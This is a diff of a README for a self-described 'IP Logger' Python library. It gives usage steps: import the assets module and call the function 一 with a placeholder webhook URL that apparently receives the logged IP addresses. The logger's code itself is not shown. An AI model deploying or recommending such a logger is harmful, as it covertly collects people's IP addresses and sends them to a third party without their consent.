@@ -2,6 +2,8 @@
 ## Simple Internet Protocol Logger I've made
 
 Usage?
-> You Can Download The Assets Folder, And Import The file And boom
-> Simple To Use, Look At The Grave -> 👻 .py File To See How to Use xdxd
-> skids gtfo
+> Download The Repo
+> Import the assets library
+> from assets.ip import 一
+> 一("webhook_goes_here")
+> basically, just import the assets library and pass the arguement in the 一 function
